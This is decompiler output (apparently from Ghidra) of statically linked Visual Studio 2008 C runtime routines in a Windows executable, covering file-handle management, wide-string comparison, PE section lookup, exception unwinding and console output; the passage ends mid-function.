//  __wsopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420ad0;
  uStack_c = 0x412d44;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_00412dd6();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00412dd6(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_00424fe0)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar5 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar6 = __errno();
      *piVar6 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar5 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          uVar8 = (uint)(ushort)wVar1;
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)(ushort)wVar2;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar3 = __towlower_l(*_Str1,&local_14);
          uVar8 = (uint)wVar3;
          wVar4 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)wVar4;
          if ((_MaxCount == 0) || (wVar3 == 0)) break;
        } while (wVar3 == wVar4);
      }
      iVar5 = uVar8 - uVar7;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int iVar3;
  int *piVar4;
  
  if (DAT_00423c80 == 0) {
    iVar3 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
        iVar3 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      }
    }
  }
  else {
    iVar3 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar3;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00412feb(undefined4 param_1)

{
  _DAT_00423ebc = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_00422040 ^ 0x420b10;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x4131c8,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_004131d0;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_004132e4();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dc8 = param_1;
  DAT_00422dc4 = in_EAX;
  DAT_00422dcc = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dc8 = param_1;
  DAT_00422dc4 = in_EAX;
  DAT_00422dcc = unaff_EBP;
  return;
}



void FUN_004132e4(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_004237a8 = _DAT_004237a8 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_00413361:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_00413361;
      }
    }
    pbVar1 = (byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_004134c4();
      }
      goto LAB_004134be;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_004134be:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_004134c4(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00424fd8)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_00424fe0)[param_1 >> 5]) == -1) {
      if (DAT_0042203c == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041352b;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_0041352b:
      *(intptr_t *)(iVar3 + (&DAT_00424fe0)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00424fd8)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_00424fe0)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_0042203c == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_004135b1;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_004135b1:
      *(undefined4 *)(iVar3 + (&DAT_00424fe0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_00424fd8 <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_00424fe0)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_00424fe0)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_004136e3();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_00424fe0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_004136e3(void)

{
  FUN_0040e64c(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_00424fe0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_00424fe0)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_00424fe0)[iVar5] = puVar4;
          DAT_00424fd8 = DAT_00424fd8 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_00424fe0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_00424fe0)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_00424fe0)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_004137e6();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_00424fe0)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_004138a4();
  }
  return local_20;
}



void FUN_004137e6(void)

{
  FUN_0040e64c(10);
  return;
}



void FUN_004138a4(void)

{
  FUN_0040e64c(0xb);
  return;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2008 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_00424fe0)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_00424fe0)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_00413a55;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_00413a55:
        FUN_00413a6a();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00413a6a(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2008 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  uint uVar2;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((_FileHandle < 0) || (DAT_00424fd8 <= (uint)_FileHandle)) {
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0;
  }
  else {
    uVar2 = (int)*(char *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
            0x40;
  }
  return uVar2;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  if (DAT_00422dd0 != 0) {
    if (DAT_00422f34 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_00422f34 == (HANDLE)0xffffffff) goto LAB_00413b84;
    BVar2 = WriteConsoleW(DAT_00422f34,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_00422dd0 = 1;
      goto LAB_00413b84;
    }
    if ((DAT_00422dd0 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_00413b84;
    DAT_00422dd0 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_00422f34 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00422f34,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_00413b84:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_00413bec;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
